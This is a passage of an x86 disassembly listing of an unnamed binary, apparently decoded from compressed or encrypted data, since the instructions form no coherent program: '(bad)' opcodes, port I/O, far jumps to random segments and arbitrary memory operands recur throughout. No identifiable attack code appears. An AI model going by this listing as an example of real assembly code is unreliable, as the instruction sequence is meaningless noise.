  4091f9:	adc    BYTE PTR [esi],0xe4
  4091fc:	int3   
  4091fd:	retf   0xec1c
  409200:	or     ebp,DWORD PTR [ebx]
  409202:	jge    0x4091cb
  409204:	call   0xbf62:0x5bd4b6cc
  40920b:	lock xchg ebp,eax
  40920d:	(bad)  
  40920e:	fisttp WORD PTR [esi-0x4d]
  409211:	aad    0x6b
  409213:	pop    ss
  409214:	test   BYTE PTR [edi],bh
  409216:	inc    edx
  409217:	or     DWORD PTR [edi],esi
  409219:	fstp   QWORD PTR [esi+0x45]
  40921c:	fidiv  WORD PTR [esi+eiz*2+0x205baa00]
  409223:	mov    ch,0x7c
  409225:	inc    esi
  409226:	cmp    eax,eax
  409228:	lea    ebp,cs:[eax+0x46]
  40922c:	mov    ds:0x37a6da28,eax
  409231:	cdq    
  409232:	neg    BYTE PTR [ecx-0x546911c5]
  409238:	and    ah,cl
  40923a:	mov    DWORD PTR [eax-0x33a4c9e4],esi
  409240:	mov    ecx,0x8d534822
  409245:	gs xchg ebp,eax
  409247:	and    bl,BYTE PTR [esi]
  409249:	inc    esp
  40924a:	adc    ebx,DWORD PTR ds:0x2bad37a8
  409250:	rcr    DWORD PTR [eax],cl
  409252:	xlat   BYTE PTR ds:[ebx]
  409253:	and    DWORD PTR [ecx],edx
  409255:	sahf   
  409256:	mov    eax,0x87d87a03
  40925b:	add    cl,al
  40925d:	out    0x2e,al
  40925f:	imul   edx,DWORD PTR [edx-0x23],0x2e
  409263:	(bad)
  409266:	push   ecx
  409267:	sbb    BYTE PTR [edx-0x532a4829],0x20
  40926e:	icebp  
  40926f:	and    ah,bh
  409271:	mov    ebp,0xa521e312
  409276:	jp     0x4091fc
  409278:	fs clc 
  40927a:	mov    dl,0x3a
  40927c:	xchg   DWORD PTR [eax],eax
  40927e:	pop    ecx
  40927f:	es sti 
  409281:	ins    BYTE PTR es:[edi],dx
  409282:	sbb    eax,0x6492554b
  409287:	call   0x71928568
  40928c:	and    BYTE PTR [edx],bh
  40928e:	in     eax,0xed
  409290:	mov    ebp,0xd1314f28
  409295:	(bad)  
  409296:	jecxz  0x409316
  409298:	inc    esp
  409299:	out    0x1b,eax
  40929b:	adc    esp,DWORD PTR [edi-0x78]
  40929e:	inc    eax
  40929f:	repnz and BYTE PTR [edx+0x5947b0a3],ah
  4092a6:	push   es
  4092a7:	dec    ebp
  4092a8:	pop    esi
  4092a9:	into   
  4092aa:	leave  
  4092ab:	mov    dl,BYTE PTR [edx+0x15cca20a]
  4092b1:	xor    BYTE PTR [ebx],bh
  4092b3:	popa   
  4092b4:	(bad)  [ebp+eiz*2-0x2b]
  4092b8:	mov    edi,0x81296057
  4092bd:	in     eax,dx
  4092be:	mov    ah,0x6c
  4092c0:	pop    esp
  4092c1:	pop    es
  4092c2:	jne    0x4092ec
  4092c4:	mov    bh,0x29
  4092c6:	pop    edi
  4092c7:	cmp    BYTE PTR [esp+ebx*2-0x4f28ad30],ah
  4092ce:	outs   dx,DWORD PTR ds:[esi]
  4092cf:	sub    eax,0x4f889421
  4092d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092d5:	leave  
  4092d6:	sahf   
  4092d7:	fild   WORD PTR [ebx-0x6b]
  4092da:	add    al,0x6d
  4092dc:	iret   
  4092dd:	dec    esi
  4092de:	or     eax,0xa71ae0cb
  4092e3:	add    eax,0xb4a4ce49
  4092e8:	mov    al,0x34
  4092ea:	pop    edi
  4092eb:	xor    DWORD PTR ss:[ecx+0x3d],esi
  4092ef:	dec    ebp
  4092f0:	mov    eax,ds:0xc65eb29a
  4092f5:	mov    bl,0x90
  4092f7:	push   eax
  4092f8:	in     eax,0xee
  4092fa:	sbb    esp,DWORD PTR [esi]
  4092fc:	imul   ebx,DWORD PTR [esi+ecx*8],0xffd13540
  409303:	adc    DWORD PTR [ecx+0x4168605d],ebx
  409309:	addr16 jns 0x409360
  40930c:	stc    
  40930d:	ins    BYTE PTR es:[edi],dx
  40930e:	aas    
  40930f:	pusha  
  409310:	fisubr DWORD PTR [edx]
  409312:	jo     0x409345
  409314:	and    dl,BYTE PTR [edi]
  409316:	inc    esi
  409317:	into   
  409318:	mov    DWORD PTR [ecx-0x1a045878],edi
  40931e:	aaa    
  40931f:	mov    ah,0x76
  409321:	xchg   edi,eax
  409322:	jns    0x409356
  409324:	outs   dx,DWORD PTR ds:[esi]
  409325:	pop    ds
  409326:	(bad)  
  409327:	outs   dx,BYTE PTR ds:[esi]
  409328:	call   0xb3f5c187
  40932d:	gs push cs
  40932f:	mov    ds:0x56c1933b,eax
  409334:	stc    
  409335:	inc    esp
  409336:	xchg   DWORD PTR [ebx-0x30],ebp
  409339:	push   edi
  40933a:	ins    DWORD PTR es:[edi],dx
  40933b:	or     eax,0x5ee3cbd2
  409340:	push   eax
  409341:	or     dh,al
  409343:	shr    DWORD PTR [edx],cl
  409345:	jnp    0x409376
  409347:	sbb    ecx,DWORD PTR [ecx-0x28]
  40934a:	jbe    0x40932a
  40934c:	adc    ch,BYTE PTR [ebx-0x47bb1bc4]
  409352:	sbb    al,0x56
  409354:	pop    es
  409355:	push   edi
  409356:	call   0x895f6ad3
  40935b:	leave  
  40935c:	xor    DWORD PTR [ebx-0x5b],edi
  40935f:	in     al,0x9a
  409361:	into   
  409362:	(bad)  
  409363:	aam    0x55
  409365:	pushf  
  409366:	dec    eax
  409367:	mov    ebp,DWORD PTR [edi]
  409369:	mov    cs,WORD PTR [edx+0xa]
  40936c:	sub    BYTE PTR [edx-0x2375c3fc],dl
  409372:	out    dx,al
  409373:	daa    
  409374:	sbb    eax,0x4f6e9e46
  409379:	test   eax,esp
  40937b:	mov    ?,WORD PTR [eax]
  40937d:	or     ebp,ebp
  40937f:	cvtps2pi mm0,QWORD PTR [edx+0x1a]
  409383:	in     eax,0x44
  409385:	jmp    ebx
  409387:	pop    edi
  409388:	add    DWORD PTR [edx],0x76
  40938b:	addr16 xor eax,0x54156fbf
  409391:	das    
  409392:	inc    ebx
  409393:	cwde   
  409394:	xchg   ebx,eax
  409395:	out    0xc5,eax
  409397:	jmp    0xe224:0xae14a0e3
  40939e:	aam    0x20
  4093a0:	out    dx,al
  4093a1:	sub    eax,0x32af5fdc
  4093a6:	pop    ss
  4093a7:	mov    esi,0x712c7144
  4093ac:	sub    ecx,DWORD PTR [eax]
  4093ae:	idiv   ebx
  4093b0:	(bad)  
  4093b1:	sbb    eax,0xf77dda17
  4093b6:	rcr    esp,1
  4093b8:	inc    eax
  4093b9:	dec    ecx
  4093ba:	mov    bl,0x39
  4093bc:	fldz   
  4093be:	xchg   esp,eax
  4093bf:	inc    esp
  4093c0:	pop    ebx
  4093c1:	and    BYTE PTR [edi],ah
  4093c3:	mov    eax,ds:0x856695c6
  4093c8:	pop    edi
  4093c9:	or     bh,BYTE PTR [ecx]
  4093cb:	outs   dx,BYTE PTR ds:[esi]
  4093cc:	add    eax,0x4dcce35a
  4093d1:	retf   0xef7a
  4093d4:	fs push edi
  4093d6:	mov    ebp,0x8cceb82f
  4093db:	add    esp,DWORD PTR ds:0xc0a2da11
  4093e1:	lods   eax,DWORD PTR ds:[esi]
  4093e2:	ret    
  4093e3:	pop    edx
  4093e4:	pushf  
  4093e5:	sahf   
  4093e6:	xchg   esi,eax
  4093e7:	(bad)  
  4093e8:	cs popf 
  4093ea:	xor    eax,0x6282d5e3
  4093ef:	mov    ah,BYTE PTR [eax-0x64]
  4093f2:	pop    edi
  4093f3:	je     0x409459
  4093f5:	sbb    DWORD PTR ds:0xc3c07ab4,ebp
  4093fb:	sti    
  4093fc:	ret    
  4093fd:	jne    0x409423
  4093ff:	ds das 
  409401:	outs   dx,BYTE PTR ds:[esi]
  409402:	retf   
  409403:	push   esi
  409404:	sbb    bl,BYTE PTR [esi+0xbdbef05]
  40940a:	sti    
  40940b:	inc    ecx
  40940c:	cmp    eax,DWORD PTR [eax-0x6a6ffa64]
  409412:	ret    0x8bcd
  409415:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409416:	retf   
  409417:	dec    esi
  409418:	fidivr WORD PTR [ecx+0x10]
  40941b:	inc    esi
  40941c:	inc    edx
  40941d:	mov    eax,ds:0xfc06781e
  409422:	mov    eax,ds:0x9058d43
  409427:	test   eax,0xa3e0cd24
  40942c:	adc    DWORD PTR [ebx-0x6f],esi
  40942f:	pop    ss
  409430:	inc    ebp
  409431:	inc    ebp
  409432:	hlt    
  409433:	xchg   cl,cl
  409435:	sbb    bh,BYTE PTR [esi]
  409437:	pop    esp
  409438:	adc    DWORD PTR [eax-0x44],esp
  40943b:	cmp    eax,ebp
  40943d:	sar    ch,1
  40943f:	add    BYTE PTR [ebx],bl
  409441:	arpl   WORD PTR [ebp-0x32acb6f5],ax
  409447:	pop    edi
  409448:	xor    BYTE PTR [ebx+0x7a0070a8],0x51
  40944f:	pop    ebp
  409450:	(bad)  
  409452:	rol    DWORD PTR [ebp+0xd49abda],0xc4
  409459:	mov    ds:0xd37d89f4,eax
  40945e:	lahf   
  40945f:	jl     0x409412
  409461:	sbb    esi,0x562f2e37
  409467:	mov    ds:0xc1829492,al
  40946c:	lds    esp,FWORD PTR [edi-0x76cf8e32]
  409472:	xor    eax,0xdef139a5
  409477:	jae    0x409499
  409479:	cmp    dl,bl
  40947b:	or     bl,BYTE PTR [edx+0x5977821c]
  409481:	adc    ch,BYTE PTR [edx]
  409483:	jne    0x4094c6
  409485:	push   ebp
  409486:	xchg   DWORD PTR [ecx-0x7a107e0f],edi
  40948c:	pushf  
  40948d:	cwde   
  40948e:	jg     0x409457
  409490:	adc    eax,0x8fc91883
  409495:	inc    ebx
  409496:	and    al,0x2
  409498:	dec    ebx
  409499:	push   edx
  40949a:	fwait
  40949b:	push   0x3c
  40949d:	mov    cl,0xa6
  40949f:	cmp    ebp,DWORD PTR [edi-0x7973ee2a]
  4094a5:	pushf  
  4094a6:	xchg   ebp,eax
  4094a7:	pop    esp
  4094a8:	popa   
  4094a9:	cwde   
  4094aa:	out    dx,al
  4094ab:	lods   eax,DWORD PTR ds:[esi]
  4094ac:	popf   
  4094ad:	adc    eax,0xa9c11b6f
  4094b2:	mov    ds:0xebedcb96,al
  4094b7:	and    ebx,0x3e870f25
  4094bd:	popa   
  4094be:	xchg   esp,eax
  4094bf:	jae    0x409519
  4094c1:	push   ecx
  4094c2:	outs   dx,BYTE PTR ds:[esi]
  4094c3:	mov    edx,0x652f601b
  4094c8:	mov    edi,0x51aa9d43
  4094cd:	cld    
  4094ce:	mov    esp,0xee7e0c1a
  4094d3:	aam    0x2f
  4094d5:	inc    edi
  4094d6:	fild   DWORD PTR [ebx-0x47]
  4094d9:	xor    bl,dl
  4094db:	in     al,dx
  4094dc:	sbb    eax,0x53fd904c
  4094e1:	(bad)  
  4094e2:	mov    bh,0xfd
  4094e4:	les    edi,FWORD PTR [ebp+0x8]
  4094e7:	in     eax,dx
  4094e8:	and    bl,dh
  4094ea:	aaa    
  4094eb:	xlat   BYTE PTR ds:[ebx]
  4094ec:	aam    0xcc
  4094ee:	daa    
  4094ef:	mov    cl,0xe4
  4094f1:	jle    0x4094f7
  4094f3:	std    
  4094f4:	cmp    dl,0x35
  4094f7:	sbb    al,0x5c
  4094f9:	push   0xffffffe4
  4094fb:	inc    edi
  4094fc:	pop    ecx
  4094fd:	pop    ss
  4094fe:	xchg   edx,eax
  4094ff:	dec    ebx
  409500:	sub    bl,BYTE PTR [esi+0x65b4b0b3]
  409506:	jp     0x409548
  409508:	xor    DWORD PTR [ebp-0x2d61ff88],ecx
  40950e:	call   0x22fc:0x6731f97f
  409515:	push   ecx
  409516:	jecxz  0x409527
  409518:	jmp    0x610b107a
  40951d:	jmp    0x78d61ce9
  409522:	stos   BYTE PTR es:[edi],al
  409523:	mov    ebx,0x6a31a6a7
  409528:	shr    BYTE PTR [edi-0x7b],cl
  40952b:	and    ch,BYTE PTR [ebp-0x67]
  40952e:	or     BYTE PTR [eax+0xf],0xb1
  409532:	jb     0x409515
  409534:	sti    
  409535:	mov    al,BYTE PTR [eax+0x31]
  409538:	cmp    bh,BYTE PTR [ebx+0x3]
  40953b:	in     eax,0x4b
  40953d:	dec    edi
  40953e:	stos   DWORD PTR es:[edi],eax
  40953f:	int3   
  409540:	call   0xdeada819
  409545:	and    edi,ecx
  409547:	dec    ebx
  409548:	test   BYTE PTR [edi-0x7c49fc36],dl
  40954e:	add    eax,0x5d977c95
  409553:	std    
  409554:	dec    esi
  409555:	pop    edx
  409556:	xchg   bl,cl
  409558:	mov    fs,ebx
  40955a:	mov    edx,0x31cb8754
  40955f:	in     eax,dx
  409560:	xor    al,0x6c
  409562:	add    al,0xe1
  409564:	lods   al,BYTE PTR ds:[esi]
  409565:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409566:	sub    eax,0xa7a0eff7
  40956b:	jo     0x4095bf
  40956d:	or     DWORD PTR ds:0x85bbea10,ecx
  409573:	mov    esp,0x60223681
  409578:	bound  ebx,QWORD PTR [ecx]
  40957a:	leave  
  40957b:	adc    ebp,DWORD PTR [edx]
  40957d:	sbb    eax,DWORD PTR [ebx+ebx*4]
  409580:	pop    es
  409581:	ret    0xa6fd
  409584:	ja     0x4095e7
  409586:	ds xchg edx,eax
  409588:	push   ebx
  409589:	pop    edx
  40958a:	fnstsw WORD PTR [eax]
  40958c:	lods   eax,DWORD PTR ds:[esi]
  40958d:	xchg   ebp,eax
  40958e:	mov    edx,0xf53ce204
  409593:	mov    dl,0x7
  409595:	dec    edx
  409596:	pushf  
  409597:	push   cs
  409598:	cs mov ecx,0x30a22e4f
  40959e:	mov    dl,0x20
  4095a0:	in     eax,dx
  4095a1:	std    
  4095a2:	jo     0x4095f1
  4095a4:	xchg   DWORD PTR [edx-0x60],ecx
  4095a7:	mov    cl,0x81
  4095a9:	(bad)  
  4095aa:	iret   
  4095ab:	pop    edx
  4095ac:	loope  0x4095f1
  4095ae:	xchg   esp,eax
  4095af:	stos   DWORD PTR es:[edi],eax
  4095b0:	push   ss
  4095b1:	iret   
  4095b2:	jo     0x409566
  4095b4:	outs   dx,BYTE PTR ds:[esi]
  4095b5:	data16 jecxz 0x4095cd
  4095b8:	aas    
  4095b9:	mov    eax,0xa72993e4
  4095be:	loope  0x4095f5
  4095c0:	das    
  4095c1:	jno    0x40959f
  4095c3:	adc    DWORD PTR [eax-0x34],0x3c2eecba
  4095ca:	adc    edx,DWORD PTR [esi]
  4095cc:	ror    DWORD PTR [edi],0x5e
  4095cf:	bound  ecx,QWORD PTR [ecx-0x46]
  4095d2:	scas   eax,DWORD PTR es:[edi]
  4095d3:	push   es
  4095d4:	dec    esi
  4095d5:	add    BYTE PTR [ecx-0x15],0x2
  4095d9:	daa    
  4095da:	push   cs
  4095db:	enter  0xf1d8,0x4c
  4095df:	lods   eax,DWORD PTR ds:[esi]
  4095e0:	cld    
  4095e1:	cmp    BYTE PTR [ebx-0x31c8aa8a],0x93
  4095e8:	bound  esi,QWORD PTR [ebx+0x3fd3bb12]
  4095ee:	adc    BYTE PTR [ecx+ebx*8],dl
  4095f1:	xor    BYTE PTR [esi-0x6f],0x1f
  4095f5:	mov    edx,0xac8b7c4e
  4095fa:	shr    BYTE PTR [eax+0xb],1
  4095fd:	and    al,0x5
  4095ff:	shr    DWORD PTR [ebx],cl
  409601:	xchg   ecx,eax
  409602:	push   ebp
  409603:	mov    bl,0x4b
  409605:	cli    
  409606:	xchg   esp,eax
  409607:	ret    
  409608:	ror    BYTE PTR [edx+0x21a7fc02],0x24
  40960f:	retf   
  409610:	int3   
  409611:	into   
  409612:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409613:	hlt    
  409614:	lods   eax,DWORD PTR gs:[esi]
  409616:	mov    dh,BYTE PTR [edx]
  409618:	inc    esi
  409619:	ror    DWORD PTR [edi+0x33a81001],0xbc
  409620:	sbb    DWORD PTR [eax-0x59deb372],edi
  409626:	repnz in al,0xda
  409629:	into   
  40962a:	pop    esp
  40962b:	add    bh,dh
  40962d:	mov    eax,0xffd2e098
  409632:	xchg   ebp,eax
  409633:	jne    0x40962e
  409635:	and    esi,DWORD PTR [edx]
  409637:	sbb    al,BYTE PTR [ebx-0x79fd0f23]
  40963d:	sub    eax,0xd4a963df
  409642:	mov    dl,0x20
  409644:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409645:	inc    ecx
  409646:	mov    ah,BYTE PTR ss:[ecx-0x12781e91]
  40964d:	mov    esp,0x49d41a39
  409652:	jmp    0x6a9c:0x66c49633
  409659:	cs mov esi,0xb7e2ed86
  40965f:	inc    esp
  409660:	adc    dl,BYTE PTR [eax]
  409662:	test   al,0x37
  409664:	(bad)  
  409665:	idiv   DWORD PTR [ebx+0x76116770]
  40966b:	out    0xef,al
  40966d:	mov    fs,WORD PTR [esi+ecx*8-0x53faaed8]
  409674:	adc    eax,DWORD PTR [eax]
  409676:	or     DWORD PTR ds:0x22c6c4dd,ebx
  40967c:	fist   WORD PTR [ecx]
  40967e:	pop    ebx
  40967f:	pop    ds
  409680:	jb     0x409681
  409682:	aaa    
  409683:	(bad)  
  409684:	mov    ch,0xbd
  409686:	adc    bh,cl
  409688:	adc    edi,ecx
  40968a:	hlt    
  40968b:	xor    DWORD PTR ds:0xbe624007,ecx
  409691:	jge    0x4096b2
  409693:	jge    0x4096d5
  409695:	ins    BYTE PTR es:[edi],dx
  409696:	adc    DWORD PTR [eax+0x20],esp
  409699:	lods   al,BYTE PTR ds:[esi]
  40969a:	dec    ebp
  40969b:	js     0x40961e
  40969d:	push   edi
  40969e:	or     al,0xc8
  4096a0:	adc    BYTE PTR [ecx+0x26fea6de],0x33
  4096a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4096a8:	pushf  
  4096a9:	(bad)  
  4096aa:	cmp    al,0x74
  4096ac:	sbb    eax,0xd4ac3538
  4096b1:	or     ebp,DWORD PTR [edx-0x2aa18865]
  4096b7:	fild   QWORD PTR [ebp+0x3f08548f]
  4096bd:	dec    ecx
  4096be:	push   edi
  4096bf:	cdq    
  4096c0:	dec    ebx
  4096c1:	(bad)  
  4096c2:	cli    
  4096c3:	mov    ecx,0x25609f03
  4096c8:	jl     0x409703
  4096ca:	fisttp WORD PTR [ebp-0x5f]
  4096cd:	scas   eax,DWORD PTR es:[edi]
  4096ce:	adc    bh,ah
  4096d0:	xchg   edx,eax
  4096d1:	mov    ebx,0xec4d3b97
  4096d6:	aad    0x9a
  4096d8:	inc    esi
  4096d9:	cmc    
  4096da:	aaa    
  4096db:	shl    BYTE PTR [ecx+0x6ab2ce8f],0xeb
  4096e2:	iret   
  4096e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096e4:	jnp    0x40975a
  4096e6:	in     eax,dx
  4096e7:	xchg   edi,eax
  4096e8:	sbb    al,0x3d
  4096ea:	jno    0x40968e
  4096ec:	or     ah,al
  4096ee:	or     al,0xf5
  4096f0:	mov    ds:0x5080b019,eax
  4096f5:	ds js  0x4096cd
  4096f8:	in     eax,0x85
  4096fa:	test   eax,0x39561387
  4096ff:	sahf   
  409700:	daa    
  409701:	scas   eax,DWORD PTR es:[edi]
  409702:	mov    dh,0x15
  409704:	cmc    
  409705:	xlat   BYTE PTR ds:[ebx]
  409706:	jno    0x4096f6
  409708:	sbb    al,0x82
  40970a:	and    DWORD PTR ds:0x4b0aff7a,edi
  409710:	cwde   
  409711:	jns    0x4096a0
  409713:	sub    BYTE PTR [eax],dh
  409715:	call   0x8f7b327d
  40971a:	jnp    0x409783
  40971c:	stc    
  40971d:	and    ebx,edx
  40971f:	or     eax,0x1170771b
  409724:	pop    esi
  409725:	(bad)  
  409726:	mov    bh,0xbe
  409728:	ret    
  409729:	jbe    0x4096d6
  40972b:	out    0x45,eax
  40972d:	cli    
  40972e:	pop    ebx
  40972f:	outs   dx,DWORD PTR ds:[esi]
  409730:	and    al,BYTE PTR [eax-0x42]
  409733:	mov    DWORD PTR [ebx-0x48],0x7ed633ec
  40973a:	mov    ecx,0x7851e486
  40973f:	jle    0x40972f
  409741:	xor    BYTE PTR [esi+0x5c],0x5a
  409745:	call   FWORD PTR [eax-0x434f6897]
  40974b:	add    BYTE PTR [esi-0x60],ch
  40974e:	xchg   ebp,eax
  40974f:	jo     0x4097b4
  409751:	sar    BYTE PTR [edi+0x12194e55],cl
  409757:	ffreep st(7)
  409759:	test   BYTE PTR [ecx+0x12],cl
  40975c:	mov    al,0xfd
  40975e:	sub    DWORD PTR [ecx+0x1499dc27],ebp
  409764:	rcl    al,1
  409766:	xor    al,0x22
  409768:	cdq    
  409769:	xor    eax,0x1363bc31
  40976e:	mov    eax,ds:0xc42380bc
  409773:	mov    edi,0xa52c2d63
  409778:	mov    cl,0x5b
  40977a:	test   BYTE PTR [ebx-0x7a3e4eef],0x7c
  409781:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409782:	and    edi,DWORD PTR [ebp+0x3f]
  409785:	js     0x4097b2
  409787:	cmp    cl,BYTE PTR [ebx]
  409789:	nop
  40978a:	test   al,0x58
  40978c:	and    al,0xb9
  40978e:	dec    ecx
  40978f:	jle    0x409808
  409791:	hlt    
  409792:	stos   BYTE PTR es:[edi],al
  409793:	pusha  
  409794:	mov    al,0xad
  409796:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409797:	test   BYTE PTR [ecx-0x30],ah
  40979a:	mov    esi,0x6b9b9444
  40979f:	sbb    eax,edi
  4097a1:	sar    BYTE PTR [edi+0x3],0xaa
  4097a5:	and    DWORD PTR [eax+0x15eb0195],ebx
  4097ab:	lds    eax,FWORD PTR [ecx]
  4097ad:	xor    ebx,ecx
  4097af:	jle    0x40973a
  4097b1:	pop    ebx
  4097b2:	inc    eax
  4097b3:	xchg   ebx,eax
  4097b4:	mov    BYTE PTR [edx],dh
  4097b6:	sub    ebp,DWORD PTR [esi]
  4097b8:	in     al,dx
  4097b9:	dec    ebp
  4097ba:	or     edx,edi
  4097bc:	clc    
  4097bd:	jle    0x409772
  4097bf:	fsubr  DWORD PTR [eax+0x27]
  4097c2:	inc    esp
  4097c3:	(bad)  
  4097c5:	mov    edi,0xe1e2f33f
  4097ca:	xor    esi,DWORD PTR [ebx+0x32df08ec]
  4097d0:	mov    ch,0x35
  4097d2:	push   esi
  4097d3:	jmp    0x4097c8
  4097d5:	scas   al,BYTE PTR es:[edi]
  4097d6:	js     0x409779
  4097d8:	aam    0x36
  4097da:	cmp    WORD PTR [edx],0xffe3
  4097de:	(bad)  
  4097df:	jmp    0x4097c3
  4097e1:	add    eax,ebx
  4097e3:	or     bh,dl
  4097e5:	add    al,0x48
  4097e7:	push   ecx
  4097e8:	push   esp
  4097e9:	repnz leave 
  4097eb:	aam    0xd8
  4097ed:	mov    ch,0x72
  4097ef:	adc    eax,0x13ab28d9
  4097f4:	adc    dh,BYTE PTR [eax+edx*4-0x5aeee400]
  4097fb:	push   esp
  4097fc:	jo     0x409802
  4097fe:	add    eax,0x39aac4f7
  409803:	and    BYTE PTR [ebx-0x7f],dl
  409806:	retf   0x18ba
  409809:	xor    al,0x2e
  40980b:	stc    
  40980c:	test   ch,bh
  40980e:	inc    edx
  40980f:	inc    ecx
  409810:	bts    DWORD PTR es:[edx+0x78],esi
  409815:	push   ecx
  409816:	jbe    0x409846
  409818:	jae    0x409836
  40981a:	lahf   
  40981b:	and    eax,0x25e4c906
  409820:	mov    bh,0x64
  409822:	lds    edx,FWORD PTR [esi-0x5fd53483]
  409828:	loope  0x4097c1
  40982a:	jnp    0x409896
  40982c:	add    eax,0x6b58de82
  409831:	addr16 pusha 
  409833:	jae    0xb134a721
  409839:	add    al,0xcb
  40983b:	cli    
  40983c:	pop    ecx
  40983d:	xor    al,BYTE PTR [ecx]
  40983f:	push   0xffffffb6
  409841:	das    
  409842:	stc    
  409843:	and    ebp,DWORD PTR [esi+0xb]
  409846:	popa   
  409847:	jmp    0x5ef9:0x7aeae91c
  40984e:	adc    eax,0x766b0e7c
  409853:	fst    st(1)
  409855:	gs mov al,0x8d
  409858:	jmp    0x4097dc
  40985a:	in     al,0xb6
  40985c:	xor    eax,0x6de7f03d
  409861:	sbb    eax,DWORD PTR [esi]
  409863:	sti    
  409864:	cmp    al,0x9
  409866:	inc    eax
  409867:	loopne 0x4098b1
  409869:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40986a:	sub    ebx,DWORD PTR [edx-0x23]
  40986d:	inc    edi
  40986e:	xchg   ebx,eax
  40986f:	mov    ds:0x9aff1212,eax
  409874:	call   0x9f52:0xd5da982a
  40987b:	push   cs
  40987c:	xchg   BYTE PTR [edi],bl
  40987e:	or     al,0xf9
  409880:	jno    0x4098fb
  409882:	cmp    al,dh
  409884:	stos   DWORD PTR es:[edi],eax
  409885:	popa   
  409886:	icebp  
  409887:	mov    edx,0xc80f7f6c
  40988c:	mov    ah,0xc0
  40988e:	ja     0x409818
  409890:	outs   dx,DWORD PTR ds:[esi]
  409891:	push   si
  409893:	shl    DWORD PTR [ebx-0xcee3e1f],1
  409899:	push   0x6eb8db7
  40989e:	mov    cl,0x33
  4098a0:	sub    edx,esp
  4098a2:	(bad)  
  4098a3:	shl    DWORD PTR [edi+ebx*4+0x73cbaa17],1
  4098aa:	std    
  4098ab:	sub    dh,BYTE PTR [ecx+0x41]
  4098ae:	scas   eax,DWORD PTR es:[edi]
  4098af:	cmp    ecx,esi
  4098b1:	mov    ecx,0xce962cb5
  4098b6:	mov    ecx,0xe59c6eb3
  4098bb:	fistp  DWORD PTR [edi-0x5c]
  4098be:	or     DWORD PTR [eax],0x6dba3438
  4098c4:	and    al,0x4b
  4098c6:	aam    0xbe
  4098c8:	ins    DWORD PTR es:[edi],dx
  4098c9:	add    BYTE PTR [ebx-0x1b],cl
  4098cc:	jmp    0x7c26f4a0
  4098d1:	push   0x3
  4098d3:	or     ah,BYTE PTR [edi+0x44b686ea]
  4098d9:	rol    DWORD PTR [ebx],1
  4098db:	cld    
  4098dc:	test   eax,0x6f95a8cc
  4098e1:	inc    ebp
  4098e2:	mov    ds:0x3d994ebe,eax
  4098e7:	inc    edx
  4098e8:	test   BYTE PTR [esi+0x6d],cl
  4098eb:	sbb    eax,0xc1ac8e61
  4098f0:	or     BYTE PTR [ebp-0x55],ch
  4098f3:	cli    
  4098f4:	mov    edx,0x18c8109d
  4098f9:	popf   
  4098fa:	mov    ds:0x9997e25e,al
  4098ff:	test   al,0x77
  409901:	cmp    ah,BYTE PTR [esp+edx*2-0x5b]
  409905:	and    BYTE PTR [ebp-0x3e16760b],bh
  40990b:	shr    dl,cl
  40990d:	sub    esi,DWORD PTR [ecx]
  40990f:	add    DWORD PTR [edi],ebx
  409911:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409912:	dec    esi
  409913:	lock out dx,eax
  409915:	and    edi,eax
  409917:	dec    edi
  409918:	in     eax,dx
  409919:	out    0xc9,al
  40991b:	xor    BYTE PTR [ebx-0x24],dl
  40991e:	push   cs
  40991f:	push   ss
  409920:	icebp  
  409921:	je     0x409998
  409923:	or     eax,0xc3688c25
  409928:	pop    ss
  409929:	xor    eax,0x2407f81c
  40992e:	out    dx,eax
  40992f:	daa    
  409930:	cmp    DWORD PTR [esi+edi*4],ebx
  409933:	and    bl,dh
  409935:	and    al,0x5b
  409937:	arpl   WORD PTR [ebp-0x59f4577c],ax
  40993d:	in     eax,0x4f
  40993f:	ins    DWORD PTR es:[edi],dx
  409940:	xchg   dl,ch
  409942:	imul   ebp,DWORD PTR [esp+edx*1-0x35ab7c43],0x80b95bfd
  40994d:	push   esp
  40994e:	rcr    ch,1
  409950:	sbb    al,0xdd
  409952:	mov    ah,0xdc
  409954:	add    eax,0xc607af05
  409959:	inc    edx
  40995a:	fisubr WORD PTR [eax+0x3d]
  40995d:	cmp    eax,0x58529d86
  409962:	fisttp WORD PTR [ebp-0x56]
  409965:	pop    ecx
  409966:	mov    ecx,0x4e8ced2b
  40996b:	ds ror dl,1
  40996e:	out    dx,eax
  40996f:	mov    eax,ds:0x4e6a027a
  409974:	pop    esp
  409975:	push   eax
  409976:	xchg   esp,eax
  409977:	and    DWORD PTR [ebx-0x3c431d68],esi
  40997d:	sbb    eax,0xa69ef7ea
  409982:	mov    bl,0x99
  409984:	jg     0x409986
  409986:	pop    ebp
  409987:	inc    esi
  409988:	inc    eax
  409989:	sahf   
  40998a:	into   
  40998b:	cmp    al,0x73
  40998d:	add    al,0xcc
  40998f:	fisubr DWORD PTR [esi]
  409991:	imul   ebp,DWORD PTR [esi-0x7c0d82de],0x25
  409998:	nop
  409999:	lahf   
  40999a:	cmp    DWORD PTR [edi-0x6a],ecx
  40999d:	rcr    DWORD PTR [esi],0xcd
  4099a0:	jb     0x409987
  4099a2:	repnz mov bl,0xaf
  4099a5:	mov    eax,0xab878345
  4099aa:	jns    0x409944
  4099ac:	sub    eax,0xd5378ba2
  4099b1:	int    0x96
  4099b3:	stos   DWORD PTR es:[edi],eax
  4099b4:	push   edi
  4099b5:	mov    edx,eax
  4099b7:	ins    BYTE PTR es:[edi],dx
  4099b8:	stc    
  4099b9:	push   edx
  4099ba:	jmp    0x409a0b
  4099bc:	mov    cl,0x3c
  4099be:	inc    edx
  4099bf:	or     al,BYTE PTR [edx-0x61]
  4099c2:	shl    ch,0xf9
  4099c5:	aad    0x49
  4099c7:	std    
  4099c8:	data16 mov dh,0xc5
  4099cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4099cc:	or     DWORD PTR [ebx-0x4dfaf8e3],edi
  4099d2:	jae    0x4099d1
  4099d4:	jbe    0x4099b0
  4099d6:	js     0x40996b
  4099d8:	dec    esi
  4099d9:	mov    edi,0x5409c0ff
